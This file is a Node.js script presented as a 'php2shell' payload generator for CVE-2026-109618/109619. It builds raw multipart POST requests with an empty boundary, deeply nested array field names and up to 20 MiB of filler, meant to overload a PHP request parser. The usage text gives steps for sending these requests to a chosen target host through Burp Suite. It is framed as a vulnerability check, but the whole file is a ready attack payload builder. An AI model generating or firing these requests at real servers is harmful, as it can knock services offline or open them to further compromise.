#!/usr/bin/env node
"use strict";

const fs = require("fs");
const path = require("path");

const NESTED_KEYS = 62;
const USER_AGENT =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
  "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 " +
  "Safari/537.36";

const PROBES = [
  { id: 1, sizeMiB: 1, parts: 4000 },
  { id: 2, sizeMiB: 8, parts: 1020 },
  { id: 3, sizeMiB: 20, parts: 1020 },
];

function buildNestedName() {
  return "a[]" + "[a]".repeat(NESTED_KEYS);
}

function buildControlBody() {
  return Buffer.from("--x\nContent-Disposition:name=a;filename=\n\n");
}

function buildProbeBody(sizeMiB, parts) {
  const size = sizeMiB << 20;
  const name = buildNestedName();
  const partStr = "--\nContent-Disposition:name=" + name + ";filename=\n\n";
  const base = partStr.repeat(parts);
  const baseLen = Buffer.byteLength(base);

  if (size < baseLen) {
    throw new Error(
      `Probe of ${size} bytes cannot hold ${parts} parts (${baseLen} bytes)`
    );
  }

  const fillerCount = Math.floor((size - baseLen) / 3);
  const chunks = [];
  chunks.push(Buffer.from("--\n"));

  const BATCH = 10000;
  for (let i = 0; i < fillerCount; i += BATCH) {
    const n = Math.min(BATCH, fillerCount - i);
    chunks.push(Buffer.from("x:\n".repeat(n)));
  }

  chunks.push(Buffer.from(base.slice(3)));

  const full = Buffer.concat(chunks);
  return full.subarray(0, full.length - 1);
}

function buildRawRequest(urlPath, host, headers, body) {
  const lines = [`POST ${urlPath} HTTP/1.1`, `Host: ${host}`];
  for (const [key, value] of Object.entries(headers)) {
    lines.push(`${key}: ${value}`);
  }
  lines.push(`Content-Length: ${body.length}`, "", "");
  return Buffer.concat([Buffer.from(lines.join("\r\n")), body]);
}

function safePath(p) {
  if (!p) return "/index.php";
  if (p.includes("Program Files") || p.includes("C:")) return "/index.php";
  return p.startsWith("/") ? p : "/" + p;
}

function printUsage() {
  console.log(`
php2shell Payload Generator — CVE-2026-109618 / CVE-2026-109619

Usage: node generate-payload.js [options]

Options:
  --host <host>       Target Host header value (default: TARGET_HOST)
  --path <path>       URL path to target (default: /index.php)
  --probe <1|2|3|all> Which probe size to generate (default: 2)
                        1 = 1 MiB, 4000 parts (small — may not trigger)
                        2 = 8 MiB, 1020 parts (recommended — confirmed working)
                        3 = 20 MiB, 1020 parts (large — maximum pressure)
                        all = generate all three probes
  --control-only      Only generate the baseline control request
  --outdir <dir>      Output directory (default: ./payloads)
  --header <K: V>     Custom header, repeatable
  --help              Show this help

Examples:
  node generate-payload.js --host example.com --path /startup.php --probe 2
  node generate-payload.js --host 10.0.0.1 --probe all
  node generate-payload.js --header "Cookie: PHPSESSID=abc" --header "Authorization: Bearer tok"
`);
}

function parseArgs(argv) {
  const args = {
    host: "TARGET_HOST",
    path: "/index.php",
    probe: "2",
    controlOnly: false,
    outdir: path.join(__dirname, "payloads"),
    headers: {},
  };

  let i = 2;
  while (i < argv.length) {
    switch (argv[i]) {
      case "--host":
        args.host = argv[++i];
        break;
      case "--path":
        args.path = safePath(argv[++i]);
        break;
      case "--probe":
        args.probe = argv[++i];
        break;
      case "--control-only":
        args.controlOnly = true;
        break;
      case "--outdir":
        args.outdir = argv[++i];
        break;
      case "--header": {
        const hdr = argv[++i];
        const idx = hdr.indexOf(":");
        if (idx === -1) {
          console.error(`Invalid header: ${hdr} (expected Key: Value)`);
          process.exit(1);
        }
        args.headers[hdr.slice(0, idx).trim()] = hdr.slice(idx + 1).trim();
        break;
      }
      case "--help":
        printUsage();
        process.exit(0);
        break;
      default:
        console.error(`Unknown option: ${argv[i]}`);
        printUsage();
        process.exit(1);
    }
    i++;
  }
  return args;
}

function main() {
  const args = parseArgs(process.argv);
  fs.mkdirSync(args.outdir, { recursive: true });

  const baseHeaders = {
    "User-Agent": USER_AGENT,
    "Accept-Encoding": "gzip",
    Connection: "close",
    ...args.headers,
  };

  // --- Control request ---
  const controlHeaders = {
    ...baseHeaders,
    "Content-Type": "multipart/form-data; boundary=x",
  };
  const controlBody = buildControlBody();
  const controlPayload = buildRawRequest(
    args.path,
    args.host,
    controlHeaders,
    controlBody
  );
  const controlFile = path.join(args.outdir, "control_request.txt");
  fs.writeFileSync(controlFile, controlPayload);
  console.log(
    `[+] Control request: ${controlFile} (${controlPayload.length} bytes)`
  );

  if (args.controlOnly) {
    console.log("\nDone — paste control_request.txt into Burp Repeater.");
    return;
  }

  // --- Probe request(s) ---
  const probeHeaders = {
    ...baseHeaders,
    "Content-Type": "multipart/form-data; boundary=",
  };

  let indices;
  if (args.probe === "all") {
    indices = [0, 1, 2];
  } else {
    const idx = parseInt(args.probe, 10) - 1;
    if (idx < 0 || idx > 2 || isNaN(idx)) {
      console.error("--probe must be 1, 2, 3, or all");
      process.exit(1);
    }
    indices = [idx];
  }

  for (const idx of indices) {
    const { id, sizeMiB, parts } = PROBES[idx];
    console.log(
      `[*] Building probe ${id}: ${sizeMiB} MiB, ${parts} parts, ${NESTED_KEYS} nested keys...`
    );

    const probeBody = buildProbeBody(sizeMiB, parts);
    const probePayload = buildRawRequest(
      args.path,
      args.host,
      probeHeaders,
      probeBody
    );

    const probeFile = path.join(
      args.outdir,
      `probe${id}_${sizeMiB}mb_${parts}parts.bin`
    );
    fs.writeFileSync(probeFile, probePayload);
    console.log(
      `[+] Probe ${id}: ${probeFile} (${(probePayload.length / (1024 * 1024)).toFixed(1)} MiB)`
    );
  }

  console.log(`
Done! Files saved to: ${args.outdir}

To test in Burp Suite:
  1. Repeater → paste control_request.txt → Send → note response
  2. Repeater → paste probe file → Send → compare response
  3. Vulnerable = probe returns 500/502/503/504 with empty body

Or use send-via-burp-proxy.js to send through Burp proxy automatically.
`);
}

main();
